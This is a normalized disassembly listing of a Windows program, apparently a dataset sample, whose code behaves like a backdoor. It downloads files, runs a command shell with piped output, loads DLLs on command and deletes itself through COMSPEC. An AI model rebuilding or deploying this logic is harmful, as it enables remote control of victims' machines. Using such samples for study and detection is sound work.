push 0x2
push 0x40000000
push ecx
call [ CreateFileA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
jne r-xdata
mov [ esp + 0x10 ] ebx
mov esi ebx
jmp r-xdata
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x24 ]
lea edx [ esp + 0x18 ]
[ edi ]
stosb [ edi ]
push edx
lea eax [ esp + 0x28 ]
push 0x2000
push eax
push esi
mov [ esp + 0x28 ] ebx
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
xor ebp ebp
jmp r-xdata
push edi
mov edi [ InternetCloseHandle@IAT ]
call edi
cmp esi ebx
je r-xdata
mov edi [ esp + 0x20 ]
mov [ esp + 0x14 ] 0x1
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
cmp ebp ebx
pop esi
je r-xdata
push esi
call edi
push rw-data
mov [ esp + eax + 0x28 ] bl
call [ LoadLibraryA@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop ebp
pop ebx
add esp 0x2018
retn
mov esi [ esp + 0x10 ]
push rw-data
push esi
call [ GetProcAddress@IAT ]
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x1c ]
push ebx
push ecx
lea ecx [ esp + 0x2c ]
push edx
push ecx
push ebp
mov [ esp + 0x30 ] ebx
call eax
push esi
call [ FreeLibrary@IAT ]
mov esi [ esp + 0x10 ]
jmp r-xdata
sub_402420
sub esp 0x108
mov ecx 0x41
xor eax eax
push ebp
push esi
push edi
lea edi [ esp + 0xc ]
[ edi ]
stosb [ edi ]
lea eax [ esp + 0xc ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
mov ebp [ esp + 0x118 ]
lea ecx [ esp + 0xc ]
push ebp
push 0x0
push rw-data
push ecx
mov [ esp + eax + 0x1c ] 0x0
call [ GetTempFileNameA@IAT ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
dec ecx
mov [ ecx + ebp ] al
call [ DeleteFileA@IAT ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov [ ecx + ebp - 0x3 ] al
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
pop edi
pop esi
mov [ ecx + ebp ] al
pop ebp
add esp 0x108
retn
sub_4024d0
mov eax 0x2214
call sub_4030e0
push esi
push edi
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x218 ]
mov edx [ esp + 0x2220 ]
[ edi ]
stosb [ edi ]
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x104
jbe r-xdata
mov al [ edx ]
mov esi edx
test al al
je r-xdata
lea edx [ esp + 0x218 ]
mov edi rw-data
jmp r-xdata
push ebx
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x114 ]
mov ebx [ strncpy@IAT ]
push ebp
mov ebp esi
[ edi ]
sub ebp edx
lea ecx [ esp + 0x118 ]
push ebp
push edx
push ecx
stosb [ edi ]
call ebx
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x1c ]
add esp 0xc
[ edi ]
stosb [ edi ]
mov al [ esi ]
mov [ esp + ebp + 0x118 ] 0x0
test al al
jne r-xdata
cmp al 0x20
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x218 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x218 ] al
lea ecx [ esp + 0x218 ]
push ecx
call sub_4016e0
add esp 0x4
pop edi
pop esi
add esp 0x2214
retn
cmp al 0x20
jne r-xdata
lea edx [ esp + 0x10 ]
push edx
jmp r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
mov al [ esi ]
mov edx esi
test al al
je r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x20
je r-xdata
call sub_402420
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x10 ] al
mov ecx 0x41
mov eax 0x0
lea edi [ esp + 0x10 ]
sub esi edx
[ edi ]
stosb [ edi ]
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
mov edi rw-data
lea ecx [ esp + 0x10 ]
push ecx
push esi
lea eax [ esp + 0x14 ]
push edx
push eax
call ebx
add esp 0xc
mov [ esp + esi + 0x10 ] 0x0
jmp r-xdata
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x118 ]
push edx
push eax
call sub_4022e0
add esp 0x8
lea edx [ esp + 0x220 ]
test eax eax
pop ebp
pop ebx
mov edi rw-data
jne r-xdata
sub_4026a0
mov eax 0x639c
call sub_4030e0
push ebx
push ebp
push esi
push edi
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x298 ]
push 0x104
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x29c ]
xor ebx ebx
mov ebp 0x1
push eax
push ebx
mov [ esp + 0x24 ] ebp
call [ GetModuleFileNameA@IAT ]
mov esi [ InternetGetConnectedState@IAT ]
push ebx
push ebx
mov [ esp + eax + 0x2a0 ] bl
call esi
test eax eax
jne r-xdata
mov esi [ CreatePipe@IAT ]
lea ecx [ esp + 0x28 ]
push ebx
lea edx [ esp + 0x28 ]
push ecx
lea eax [ esp + 0x1c ]
push edx
push eax
mov [ esp + 0x38 ] 0xc
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebp
call esi
test eax eax
jne r-xdata
mov edi [ Sleep@IAT ]
lea ecx [ esp + 0x28 ]
push ebx
lea edx [ esp + 0x24 ]
push ecx
lea eax [ esp + 0x24 ]
push edx
push eax
call esi
test eax eax
je r-xdata
push rw-data
call sub_4016e0
mov ebp [ Sleep@IAT ]
add esp 0x4
jmp r-xdata
push 0xea60
call edi
push ebx
push ebx
call esi
test eax eax
je r-xdata
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x44 ]
[ edi ]
lea ecx [ esp + 0x44 ]
push ecx
call [ GetStartupInfoA@IAT ]
mov ecx 0x41
lea edi [ esp + 0x190 ]
mov eax [ esp + 0x24 ]
mov edx [ esp + 0x1c ]
mov [ esp + 0x84 ] eax
mov [ esp + 0x80 ] eax
xor eax eax
push 0x104
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x194 ]
mov [ esp + 0x48 ] 0x44
push eax
mov [ esp + 0x78 ] 0x101
mov [ esp + 0x84 ] edx
mov [ esp + 0x7c ] bx
call [ GetSystemDirectoryA@IAT ]
mov edx eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea ebp [ esp + 0x190 ]
mov esi edi
mov edi ebp
mov ebp ecx
or ecx 0xffffffff
mov [ esp + edx + 0x190 ] bl
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x88 ]
add ecx edx
mov [ esp + ecx + 0x190 ] bl
mov ecx 0x41
[ edi ]
lea ecx [ esp + 0x88 ]
push ecx
push 0x105
stosb [ edi ]
call [ GetTempPathA@IAT ]
mov edx eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea ebp [ esp + 0x88 ]
mov esi edi
mov edi ebp
mov ebp ecx
or ecx 0xffffffff
mov [ esp + edx + 0x88 ] bl
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ebx
add ecx edx
lea edx [ esp + 0x8c ]
lea eax [ esp + 0x194 ]
push edx
push eax
mov [ esp + ecx + 0x94 ] bl
call [ CopyFileA@IAT ]
test eax eax
jne r-xdata
push 0x3e8
call ebp
push ebx
mov ecx [ esp + 0x38 ]
push ecx
call [ TerminateProcess@IAT ]
push 0x7d0
call ebp
lea edx [ esp + 0x88 ]
push edx
call [ DeleteFileA@IAT ]
push 0x7d0
call ebp
call sub_402ed0
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x639c
retn 0x10
xor ecx ecx
lea edx [ esp + 0x34 ]
lea eax [ esp + 0x44 ]
mov [ esp + 0x34 ] ecx
push edx
push eax
mov [ esp + 0x40 ] ecx
push ebx
push ebx
mov [ esp + 0x4c ] ecx
push ebx
push 0x1
mov [ esp + 0x58 ] ecx
push ebx
push ebx
lea ecx [ esp + 0xa8 ]
push rw-data
push ecx
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
push rw-data
call sub_4016e0
add esp 0x4
mov esi [ PeekNamedPipe@IAT ]
mov ebp [ Sleep@IAT ]
push rw-data
call sub_4016e0
mov ebp [ Sleep@IAT ]
add esp 0x4
jmp r-xdata
mov [ esp + 0x18 ] ebx
mov ecx [ esp + 0x14 ]
push ebx
lea edx [ esp + 0x14 ]
push ebx
push edx
lea eax [ esp + 0x43b4 ]
push 0x2000
push eax
push ecx
call esi
test eax eax
je r-xdata
lea edi [ esp + 0x3a0 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x3a0 ]
mov [ esp + ecx + 0x3a0 ] bl
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
push 0x1770
call ebp
jmp r-xdata
push rw-data
jmp r-xdata
mov edx [ esp + 0x10 ]
cmp edx ebx
jne r-xdata
mov esi rw-data
lea eax [ esp + 0x3a0 ]
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x3a0 ]
[ edi ]
lea ecx [ esp + 0x3a0 ]
push ecx
stosb [ edi ]
call sub_401590
add esp 0x4
test eax eax
jne r-xdata
call sub_4016e0
add esp 0x4
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x43a8 ]
push ebx
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x43ac ]
push eax
push edx
mov edx [ esp + 0x20 ]
push ecx
push edx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0x32
call ebp
push ebx
lea edx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebx
push edx
lea eax [ esp + 0x43b4 ]
push 0x2000
push eax
push ecx
call esi
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
push rw-data
jmp r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
mov edx [ esp + 0x10 ]
cmp edx ebx
je r-xdata
mov esi rw-data
lea eax [ esp + 0x3a0 ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x43a8 ]
mov [ esp + 0x10 ] ebx
[ edi ]
stosb [ edi ]
cmp [ esp + 0x18 ] ebx
jne r-xdata
mov [ esp + eax + 0x43a8 ] bl
lea eax [ esp + 0x43a8 ]
push eax
call sub_4016e0
add esp 0x4
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi rw-data
lea eax [ esp + 0x3a0 ]
push rw-data
call sub_4016e0
add esp 0x4
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov ecx 0x3
mov edi rw-data
lea esi [ esp + 0x3a0 ]
xor eax eax
[ esi ] [ edi ]
jne r-xdata
call sub_401a30
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov esi rw-data
lea eax [ esp + 0x3a0 ]
lea ecx [ esp + 0x3a0 ]
push ecx
call sub_402060
add esp 0x4
jmp r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov ecx 0x7
mov edi rw-data
lea esi [ esp + 0x3a0 ]
xor eax eax
[ esi ] [ edi ]
jne r-xdata
call sub_402230
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov esi rw-data
lea eax [ esp + 0x3a0 ]
lea ecx [ esp + 0x3a0 ]
push ecx
call sub_4024d0
add esp 0x4
jmp r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
push rw-data
mov esi rw-data
lea eax [ esp + 0x3a0 ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x3a0 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x3a4 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x3a4 ] bl
call [ LoadLibraryA@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x23a4 ]
lea edx [ esp + 0x23a4 ]
[ edi ]
stosb [ edi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x23a4 ]
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x23a4 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x23a4 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x23a4 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x23a4 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x23a4 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x23a4 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x23a4 ]
push eax
mov [ esp + ecx + 0x23a8 ] bl
call sub_4016e0
add esp 0x4
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
push rw-data
push esi
call [ GetProcAddress@IAT ]
mov edx eax
lea eax [ esp + 0x10 ]
push ebx
push eax
lea edi [ esp + 0x3a8 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esp + 0x28 ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x3ac ]
push ecx
push eax
call edx
push esi
call [ FreeLibrary@IAT ]
push 0x7d0
call ebp
mov esi [ PeekNamedPipe@IAT ]
jmp r-xdata
push rw-data
call sub_4016e0
add esp 0x4
jmp r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_402ed0
sub esp 0x354
mov ecx 0x41
xor eax eax
push ebx
push ebp
push esi
push edi
lea edi [ esp + 0x4c ]
push 0x104
[ edi ]
stosb [ edi ]
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x260 ]
[ edi ]
stosb [ edi ]
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x158 ]
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x50 ]
xor edi edi
push eax
push edi
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x354
retn
lea ecx [ esp + 0x4c ]
push 0x104
lea edx [ esp + 0x50 ]
push ecx
push edx
call [ GetShortPathNameA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x25c ]
push 0x104
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x154 ]
push rw-data
push ecx
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea edx [ esp + 0x4c ]
lea eax [ esp + 0x154 ]
push edx
push eax
call esi
lea ecx [ esp + 0x154 ]
push rw-data
push ecx
call esi
mov [ esp + 0x18 ] edi
lea edx [ esp + 0x25c ]
lea eax [ esp + 0x154 ]
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
mov edi [ GetCurrentProcess@IAT ]
push 0x100
mov [ esp + 0x14 ] 0x3c
mov [ esp + 0x20 ] rw-data
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] eax
mov [ esp + 0x18 ] 0x40
call edi
mov esi [ SetPriorityClass@IAT ]
push eax
call esi
mov ebx [ GetCurrentThread@IAT ]
push 0xf
call ebx
mov ebp [ SetThreadPriority@IAT ]
push eax
call ebp
lea ecx [ esp + 0x10 ]
push ecx
call [ ShellExecuteExA@IAT ]
test eax eax
je r-xdata
push 0x20
call edi
push eax
call esi
push 0x0
call ebx
push eax
call ebp
mov edx [ esp + 0x48 ]
push 0x40
push edx
call esi
mov eax [ esp + 0x48 ]
push 0x1
push eax
call [ SetProcessPriorityBoost@IAT ]
lea ecx [ esp + 0x4c ]
push 0x0
push ecx
push 0x1
push 0x4
call [ SHChangeNotify@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x354
retn
sub_4030e0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_403295
cmp [ rw-data ] ebx
jne r-xdata
call sub_403280
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_403292
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4026a0
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401000
call ??0Init@ios_base@std@@QAE@XZ
jmp sub_401020
??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
sub_401020
push ??1Init@ios_base@std@@QAE@XZ
call sub_40309e
pop ecx
retn
??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_401040
call ??0_Winit@std@@QAE@XZ
jmp sub_401060
??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_401060
push ??1_Winit@std@@QAE@XZ
call sub_40309e
pop ecx
retn
??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
sub_401080
call sub_401090
jmp sub_4010a0
sub_401090
push rw-data
mov ecx rw-data
call Ordinal_MFC42_537
retn
sub_4010a0
push sub_4010b0
call sub_40309e
pop ecx
retn
sub_4010b0
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
retn
or cl al
mov [ rw-data ] cl
mov ecx rw-data
jmp Ordinal_MFC42_800
sub_401460
mov [ ecx ] r--data
retn
sub_401470
mov al [ esp + 0x4 ]
push esi
mov esi ecx
test al 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_402660
call sub_402670
jmp sub_402680
sub_402670
push 0x0
mov ecx rw-data
call Ordinal_MFC42_561
retn
sub_402680
push sub_402690
call sub_40309e
pop ecx
retn
sub_402690
mov ecx rw-data
jmp Ordinal_MFC42_815
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_403072
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_40309e
push [ esp + 0x4 ]
call sub_403072
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_ftol
jmp [ _ftol@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
sub_403261
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_403280
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_403292
xor eax eax
retn
sub_403295
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
Ordinal_MFC42_537
jmp [ Ordinal_MFC42_537@IAT ]
Ordinal_MFC42_800
jmp [ Ordinal_MFC42_800@IAT ]
Ordinal_MFC42_535
jmp [ Ordinal_MFC42_535@IAT ]
Ordinal_MFC42_939
jmp [ Ordinal_MFC42_939@IAT ]
Ordinal_MFC42_941
jmp [ Ordinal_MFC42_941@IAT ]
Ordinal_MFC42_540
jmp [ Ordinal_MFC42_540@IAT ]
Ordinal_MFC42_4203
jmp [ Ordinal_MFC42_4203@IAT ]
Ordinal_MFC42_940
jmp [ Ordinal_MFC42_940@IAT ]
Ordinal_MFC42_859
jmp [ Ordinal_MFC42_859@IAT ]
Ordinal_MFC42_858
jmp [ Ordinal_MFC42_858@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
sub_4032f0
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_4032f8
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_403300
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_403317
mov eax r--data
jmp __CxxFrameHandler
sub_403330
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_800
sub_403338
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_403340
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_403357
mov eax r--data
jmp __CxxFrameHandler
sub_403370
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_403378
lea ecx [ ebp - 0x20 ]
jmp Ordinal_MFC42_800
sub_403380
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_800
sub_403388
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_403390
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_4033a7
mov eax r--data
jmp __CxxFrameHandler
sub_4033c0
lea ecx [ ebp - 0x14 ]
jmp sub_401460
sub_4033c8
mov eax r--data
jmp __CxxFrameHandler
